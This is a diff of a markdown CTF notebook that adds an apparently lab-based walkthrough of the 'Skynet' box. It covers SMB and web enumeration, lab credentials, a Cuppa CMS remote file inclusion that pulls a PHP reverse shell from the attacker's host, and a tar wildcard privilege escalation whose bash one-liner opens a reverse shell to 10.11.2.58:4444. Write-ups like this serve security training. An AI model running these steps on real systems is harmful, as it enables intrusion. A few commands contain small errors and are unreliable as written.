@@ -170,7 +170,7 @@ Host script results:
 ```
 
 We are going to query searchsploit to understand what this vuln is about:
-`searchspoilt --update && searchsploit CVE-2017-0143`
+`searchsploit --update && searchsploit CVE-2017-0143`
 
 We start Metasploit with `msfconsole` command.
 
@@ -698,3 +698,84 @@ Upgrade-Insecure-Requests: 1
 ```
 
 Finally, replace `echo 4` with `cat /root/root.txt` to get the root flag.
+
+
+### Day 6 - More to come
+
+#### Skynet
+
+```
+nmap -sC -sV -T5 --min-rate 2500 target -oN nmap.log
+nmap --script vuln -p139,445 target
+smbclient //target/anonymous #get all text files
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://target/FUZZ
+```
+
+Result:
+```
+.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10]
+admin                   [Status: 301, Size: 300, Words: 20, Lines: 10]
+ai                      [Status: 301, Size: 297, Words: 20, Lines: 10]
+config                  [Status: 301, Size: 301, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 298, Words: 20, Lines: 10]
+js                      [Status: 301, Size: 297, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 271, Words: 20, Lines: 10]
+squirrelmail            [Status: 301, Size: 307, Words: 20, Lines: 10]
+```
+
+##### Get the passwords
+
+squirrelmail
+```
+milesdyson:cyborg007haloterminator
+```
+which was just the longest one in `log1.txt`.
+
+Samba (you will get after logging in to squirrelmail):
+```
+milesdyson:)s{A&2Z=F^n_E.B`
+```
+
+From Samba get `important.txt` which reveals the hidden directory that you can directory bruteforce: 
+```
+smbclient --user=milesdyson //target/milesdyson
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target/45kra24zxs28v3yd/FUZZ
+```
+
+Result:
+```
+.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10]
+administrator           [Status: 301, Size: 325, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 418, Words: 45, Lines: 16]
+```
+
+Goto `/administrator`, you will find Cuppa CMS. This has know local/remote file inclusion vulnerability ([exploit-db](https://www.exploit-db.com/exploits/25971)).
+
+##### Reverse shell
+Download pentestmonkey's php reverse shell:
+```
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+edit it and start a local PHP server to serve the file for the remote file inclusion:
+
+```
+sudo python3 -m http-server 80
+curl http://target/45kra24zxs28v3yd/administrator//alerts/alertConfigField.php?urlConfig=http://10.11.2.58/shell.php
+```
+
+##### Priv esc
+In `/home/milesdyson` you find a folder `backups` that contains a `backup.sh` run by a cronjob (check `cat /etc/crontab`).
+
+You can abuse the wildcard on tar command by using this [exploit](https://github.com/mikaelkall/HackingAllTheThings/tree/master/docs/privesc/linux/tar_commands_execution)
+
+```
+echo "#!/bin/bash\nbash -i >& /dev/tcp/10.11.2.58/4444 0>&1" > shell.sh
+chmod +x shell.sh
+touch ./'--checkpoint-action=exec=sh shell.sh'
+touch ./'--checkpoint=1'
+```
